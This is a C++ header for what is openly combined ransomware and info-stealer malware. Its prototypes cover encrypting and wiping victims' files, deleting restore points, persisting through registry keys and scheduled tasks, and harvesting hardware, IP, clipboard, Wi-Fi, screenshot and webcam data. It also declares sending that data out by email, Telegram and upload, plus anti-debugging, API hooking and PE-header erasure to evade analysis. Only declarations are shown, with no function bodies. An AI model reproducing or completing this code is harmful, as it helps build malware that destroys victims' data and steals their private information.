#pragma once
#include "../commons/common.h"
#include "json.hpp"
#include <sstream>
#include <dshow.h>
#include <cstdint>
#include <MinHook.h>
#include <DbgHelp.h>
#include <wininet.h>
#include <atlimage.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <experimental/filesystem>
#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "strmiids.lib")

typedef struct timeval2 {
    long tv_sec;
    long tv_usec;
} timeval2;

extern std::vector<std::string> filesLink;


// functions.cpp
std::string Exec(const char* cmd);
void CreateAndSetRegKey(HKEY key, std::string keyPath, std::string keyName, std::string value);
std::vector<std::string> Split(const std::string& s, const char& delimiter);
std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
std::vector<std::vector<BYTE>> VectorSplitter(const std::vector<BYTE>& baseVector, int parts);
bool Copyfile(const char* From, const char* To);
bool FileExists(const std::string& name);
void DropFile(const std::string& content, const std::string& path, bool dec = true);
void ChangeWallpaper(const std::string& content);
void ChangeIcon();

// sender.cpp
bool IsConnected2Internet();
void SendEmail();
void SendTelegram();
void ScheduleTask();

// encryption.cpp
bool isFileToEncrypt(const std::string& file);
void GetAllFiles(const std::string& folderPath);
std::vector<std::string> RetrieveFolders(int argc, char* argv[]);
std::vector<std::string> GetFiles(const std::vector<std::string>& mainDirs);
void EncryptFiles(const std::vector<std::string>& files, const std::string& key, const std::string& iv);
void WipeFiles(const std::vector<std::string>& files);

// info-stealer.cpp
int GetTimeOfDay(struct timeval* tp, struct timezone* tzp);
std::string GetRandomUserAgent();
std::string GetDate();
std::string GetHWID();
std::string GetIPData();
std::string GetCPU();
std::string GetGPU();
std::string GetPcName();
std::string GetUsername();
std::string GetResolution();
std::string GetWinVersion();
std::string GetDrives();
std::string GetLanguage();
std::string GetClipboard();
std::string GetWifi();
std::string GetScreenshot();
std::vector<std::string> GetWebcams();
void UploadFiles(const std::vector<std::string>& files);
std::vector<std::string> GetLinks();

// security.cpp
std::string RunEncCommand(const std::string& cmd);
std::string GenerateRandom(const int len);
DWORD TrojanFunction(LPVOID url);
DWORD RemoveTasks(LPVOID params_useless);
void DeleteRestorePoints();
void DeleteMe(const std::string& myPath);
void PEHeaderDeleter();
void ImageSizeIncreaser();
BOOL WINAPI HookIsDebuggerPresent();
bool AntiDebug();
